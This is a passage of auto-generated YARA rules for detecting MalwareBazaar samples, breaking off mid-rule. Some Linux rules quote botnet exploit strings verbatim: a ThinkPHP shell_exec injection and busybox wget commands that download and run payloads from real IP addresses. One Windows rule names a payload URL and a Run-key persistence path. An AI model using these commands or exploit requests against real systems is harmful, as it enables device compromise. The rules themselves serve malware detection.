        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data.rel.ro"
        $s11 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 100KB and
        all of them
}

rule Windows_97c2d5b8641875634156368989ff410bb6b5cab67c2c5430b73cb47d51982012
{
    meta:
        description = "Auto ML: 97c2d5b8641875634156368989ff410bb6b5cab67c2c5430b73cb47d51982012"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "P UASeT"
        $s5 = ",+srwiNY1S"
        $s6 = "prWiN"
        $s7 = "!pu~IVP)KLnjV6D\\Z~V/FJw?=NnI'{%36nz!.hO8Hj>+)mw{TS\\2SEtkV6DYBkU*D@n!:OnJ-m>96j"
        $s8 = "DbSet`1"
        $s9 = "HashSet`1"
        $s10 = "get_seat2"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "System.Collections.Generic"
        $s14 = "get_MovieId"
        $s15 = "set_MovieId"
        $s16 = "get_HallId"
        $s17 = "set_HallId"
        $s18 = "get_UserId"
        $s19 = "set_UserId"
        $s20 = "userId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1420KB and
        all of them
}

rule Windows_0f73dc9673062de7bb486da601791e67e78e9aaae6a1dc5fabbdf5abe5fcc058
{
    meta:
        description = "Auto ML: 0f73dc9673062de7bb486da601791e67e78e9aaae6a1dc5fabbdf5abe5fcc058"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 179KB and
        all of them
}

rule Windows_97ee222794b0e20266259caf3ff1e198f56c4cf87af316452a9bd2f8f9982a6b
{
    meta:
        description = "Auto ML: 97ee222794b0e20266259caf3ff1e198f56c4cf87af316452a9bd2f8f9982a6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17619KB and
        all of them
}

rule Windows_97f65a11f372b7cfdace34c1aac4b114f3d04bbc73b4c1dc3be743d506532b5d
{
    meta:
        description = "Auto ML: 97f65a11f372b7cfdace34c1aac4b114f3d04bbc73b4c1dc3be743d506532b5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "SetThreadPreferredUILanguages"
        $s7 = "kernel32"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 3024KB and
        all of them
}

rule Linux_98275127b4568f7b96e1d56112f4e4e216cccc04d11c05e7a7aef462dafb517a
{
    meta:
        description = "Auto ML: 98275127b4568f7b96e1d56112f4e4e216cccc04d11c05e7a7aef462dafb517a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 48KB and
        all of them
}

rule Windows_986ac471d320e58d3398bb0ca041f53286265a3d3719543d07c32b27025b85ce
{
    meta:
        description = "Auto ML: 986ac471d320e58d3398bb0ca041f53286265a3d3719543d07c32b27025b85ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4605KB and
        all of them
}

rule Windows_98c5b27797be37eee59bbd120c39463aa64f8f59d26dbe3c46fae389d4fe41a9
{
    meta:
        description = "Auto ML: 98c5b27797be37eee59bbd120c39463aa64f8f59d26dbe3c46fae389d4fe41a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "attempts."
        $s6 = "You are getting closer."
        $s7 = "You are very close!"
        $s8 = "attempts. The correct number was"
        $s9 = "ios_base::badbit set"
        $s10 = "ios_base::failbit set"
        $s11 = "ios_base::eofbit set"
        $s12 = "already connected"
        $s13 = "bad file descriptor"
        $s14 = "connection aborted"
        $s15 = "connection already in progress"
        $s16 = "connection refused"
        $s17 = "connection reset"
        $s18 = "file exists"
        $s19 = "file too large"
        $s20 = "filename too long"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 603KB and
        all of them
}

rule Linux_9902df7149b19f56fdf08e56e299835da52093b292066b0eed0dcc4847d10eb4
{
    meta:
        description = "Auto ML: 9902df7149b19f56fdf08e56e299835da52093b292066b0eed0dcc4847d10eb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuPOST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 77KB and
        all of them
}

rule Linux_99119e4a6302bad65f77ccebea703adc800906e19efce05dcb87c96eb4146b0d
{
    meta:
        description = "Auto ML: 99119e4a6302bad65f77ccebea703adc800906e19efce05dcb87c96eb4146b0d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Cmdc"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 40KB and
        all of them
}

rule Windows_992a18c1acf77c16753e3427ad1b034bb492db056afc0849577559fba16069ed
{
    meta:
        description = "Auto ML: 992a18c1acf77c16753e3427ad1b034bb492db056afc0849577559fba16069ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_9932a993d99136f37df22dd144438e8dfe94bc17b0de0b4da258c64cc401e229
{
    meta:
        description = "Auto ML: 9932a993d99136f37df22dd144438e8dfe94bc17b0de0b4da258c64cc401e229"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1060KB and
        all of them
}

rule Windows_996bd2fdc641a08e3b893338d3e6d697ce57902ce50f6e51779fdaa53ce2de8d
{
    meta:
        description = "Auto ML: 996bd2fdc641a08e3b893338d3e6d697ce57902ce50f6e51779fdaa53ce2de8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "ProcessPH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = "kernel32H9"
        $s17 = ".dllu"
        $s18 = "omitemptM9/"
        $s19 = "mas.openH"
        $s20 = "preadsheH"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3465KB and
        all of them
}

rule Windows_0faa7c27d8cedbb19af0586a236ce4eca6b151509e526bedcc970606e391ce74
{
    meta:
        description = "Auto ML: 0faa7c27d8cedbb19af0586a236ce4eca6b151509e526bedcc970606e391ce74"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_9972ff74fd86bc011a83334ddcbd97a3123c6a0f723e2999c6c6bdde9dfef141
{
    meta:
        description = "Auto ML: 9972ff74fd86bc011a83334ddcbd97a3123c6a0f723e2999c6c6bdde9dfef141"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "kernel32"
        $s8 = "kernel32.dll"
        $s9 = "wininet.dll"
        $s10 = "Wininet.dll"
        $s11 = "user32.dll"
        $s12 = "IPHLPAPI.DLL"
        $s13 = "Kernel32.dll"
        $s14 = "rasapi32.dll"
        $s15 = "ADVAPI32.DLL"
        $s16 = "advapi32.dll"
        $s17 = "user32"
        $s18 = "CreateWaitableTimerA"
        $s19 = "SetWaitableTimer"
        $s20 = "CloseHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1196KB and
        all of them
}

rule Linux_99804ad418ef95e82d94a81fb390ff0f37378b9af1a6d9d91da857ee1c00394b
{
    meta:
        description = "Auto ML: 99804ad418ef95e82d94a81fb390ff0f37378b9af1a6d9d91da857ee1c00394b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Windows_9a23805b493744d541cc279f7676d724e7a0f2824612fc9393c68d49ea2eb384
{
    meta:
        description = "Auto ML: 9a23805b493744d541cc279f7676d724e7a0f2824612fc9393c68d49ea2eb384"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB and
        all of them
}

rule Windows_9a44c666e5abbd216aaad1d78ea84dba7526b3f613c7f3396ddd1a810e9b0356
{
    meta:
        description = "Auto ML: 9a44c666e5abbd216aaad1d78ea84dba7526b3f613c7f3396ddd1a810e9b0356"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Framework.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{863F4E86-8B82-4516-A5DA-5B68D0263B21}"
        $s15 = "<Module>{6f0a29d3-3420-4578-807e-6edb6f462410}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Security.Cryptography"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 579KB and
        all of them
}

rule Windows_9a51ed2069f54c90bac392ebb1081aa64dee9c2705df9944bc43db671c87dd94
{
    meta:
        description = "Auto ML: 9a51ed2069f54c90bac392ebb1081aa64dee9c2705df9944bc43db671c87dd94"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetByNhom>b__0"
        $s5 = "DbSet`1"
        $s6 = "HashSet`1"
        $s7 = "<Module>"
        $s8 = "get_nbtfbY"
        $s9 = "get_Magenta"
        $s10 = "get_selectedLienLac"
        $s11 = "System.Collections.Generic"
        $s12 = "Load"
        $s13 = "set_FormattingEnabled"
        $s14 = "get_principal_id"
        $s15 = "set_principal_id"
        $s16 = "get_diagram_id"
        $s17 = "set_diagram_id"
        $s18 = "get_ButtonFace"
        $s19 = "CreateInstance"
        $s20 = "set_DataSource"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 735KB and
        all of them
}

rule Windows_9a52f61ff398e3f0fa6137ddb4fb3aa19e012bc8bfc20897e9fe33bf1f4bdbc3
{
    meta:
        description = "Auto ML: 9a52f61ff398e3f0fa6137ddb4fb3aa19e012bc8bfc20897e9fe33bf1f4bdbc3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Uhcmd7"
        $s5 = "Thcmd7EK GS"
        $s6 = "wYhcmd7"
        $s7 = "YEhcmd7Eh3G_"
        $s8 = "4n2SeTKuRlq"
        $s9 = "z5|w2GT+\\G6qCRcgeT2i\"]"
        $s10 = "fyMdrEADg"
        $s11 = "XcseTwlq"
        $s12 = "hmo9[c0SeTAa"
        $s13 = "Tcset|x"
        $s14 = "&n:SeTRa"
        $s15 = "ksET4"
        $s16 = "oW2pSEtP=QC"
        $s17 = "x+Y>O-7wKEOQWuT.iwzcmd2(U[V"
        $s18 = "i-zCmd2"
        $s19 = "zcmd2lUDVl=Q"
        $s20 = "Winx"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2337KB and
        all of them
}

rule Linux_9a5f20dfaf89eb0af23978f5b33145f5cc384f9f13beaa8edc69e47a04c51580
{
    meta:
        description = "Auto ML: 9a5f20dfaf89eb0af23978f5b33145f5cc384f9f13beaa8edc69e47a04c51580"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data.rel.ro"
        $s11 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 96KB and
        all of them
}

rule Windows_9a80eb8aea03ed2b2306b53cb06542e8cae92b40008851bcc7d3eff62944c5b9
{
    meta:
        description = "Auto ML: 9a80eb8aea03ed2b2306b53cb06542e8cae92b40008851bcc7d3eff62944c5b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = "@.reloc"
        $s5 = "B.rsrc"
        $s6 = "System"
        $s7 = "GetLongPathNameW"
        $s8 = "Windows"
        $s9 = "TFileName"
        $s10 = ":TFormatSettings.:10"
        $s11 = ":TFormatSettings.:20"
        $s12 = ":TFormatSettings.:3"
        $s13 = ":TFormatSettings.:4"
        $s14 = "TFormatSettings"
        $s15 = "TThreadLocalCounter"
        $s16 = "$TMultiReadExclusiveWriteSynchronizer"
        $s17 = "TModuleInfo"
        $s18 = "VariantChangeTypeEx"
        $s19 = "EVariantArrayCreateError"
        $s20 = "bdRightToLeftReadingOnly"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1056KB and
        all of them
}

rule Windows_9a880d7572486dd985ed6ffbf55eee8875077d9614befc12d5fbdaafd45e86d5
{
    meta:
        description = "Auto ML: 9a880d7572486dd985ed6ffbf55eee8875077d9614befc12d5fbdaafd45e86d5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 819KB and
        all of them
}

rule Windows_9aaa8c778af26767dd8b2f1134a119c3e9c9d27c4385810c238d350190c7e401
{
    meta:
        description = "Auto ML: 9aaa8c778af26767dd8b2f1134a119c3e9c9d27c4385810c238d350190c7e401"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "\\Microsoft\\Network\\Connections"
        $s5 = "https://clfeed.online/keyfileupdate/rst32.jpg"
        $s6 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $s7 = "Microsoft.Win32"
        $s8 = "<Module>"
        $s9 = "RDZBOEI0NDUtODY1NC00MUYwLUEzOTMtM0ZCMDA5NkZFNjJEQUFB"
        $s10 = "System.IO"
        $s11 = "Thread"
        $s12 = "set_Method"
        $s13 = "set_Mode"
        $s14 = "GetEnvironmentVariable"
        $s15 = "File"
        $s16 = "set_FileName"
        $s17 = "WriteLine"
        $s18 = "HttpWebResponse"
        $s19 = "GetResponse"
        $s20 = "Close"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10KB and
        all of them
}

rule Windows_0fc292968815c4c7e58f76fec1193c36400977d3dae10d42ccda83ec5c14c9d0
{
    meta:
        description = "Auto ML: 0fc292968815c4c7e58f76fec1193c36400977d3dae10d42ccda83ec5c14c9d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 8028KB and
        all of them
}

rule Windows_9ab71d8aeef723a7e6eb9587b05b9a5a2d5663ff760820deec1016e3b5c47cf4
{
    meta:
        description = "Auto ML: 9ab71d8aeef723a7e6eb9587b05b9a5a2d5663ff760820deec1016e3b5c47cf4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "mscoree.dll"
        $s5 = "If you want to change the Windows User Account Control level replace the"
        $s6 = "requestedExecutionLevel node with one of the following."
        $s7 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s8 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s9 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s10 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s11 = "<!-- A list of the Windows versions that this application has been tested on"
        $s12 = "and Windows will automatically select the most compatible environment. -->"
        $s13 = "<!-- Windows Vista -->"
        $s14 = "<!-- Windows 7 -->"
        $s15 = "<!-- Windows 8 -->"
        $s16 = "<!-- Windows 8.1 -->"
        $s17 = "<!-- Windows 10 -->"
        $s18 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s19 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s20 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3362KB and
        all of them
}

rule Windows_9acdb4684a7653fe85b32281195f2d1af944142f6001c38f6793f099dd0f997c
{
    meta:
        description = "Auto ML: 9acdb4684a7653fe85b32281195f2d1af944142f6001c38f6793f099dd0f997c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "DELETEHELPER"
        $s7 = "System.Data"
        $s8 = "loadData"
        $s9 = "Read"
        $s10 = "QuanLyHS_Load"
        $s11 = "QuanLyGV_Load"
        $s12 = "add_Load"
        $s13 = "ManHinhChinh_Load"
        $s14 = "DangNhap_Load"
        $s15 = "DangKy_Load"
        $s16 = "TTGiangDay_Load"
        $s17 = "get_OrangeRed"
        $s18 = "get_Checked"
        $s19 = "set_Checked"
        $s20 = "set_FormattingEnabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 897KB and
        all of them
}

rule Windows_9ae1049e0579fd8ef08a03d050571ff770d1c8957ddbf210e3257dd88e08c23d
{
    meta:
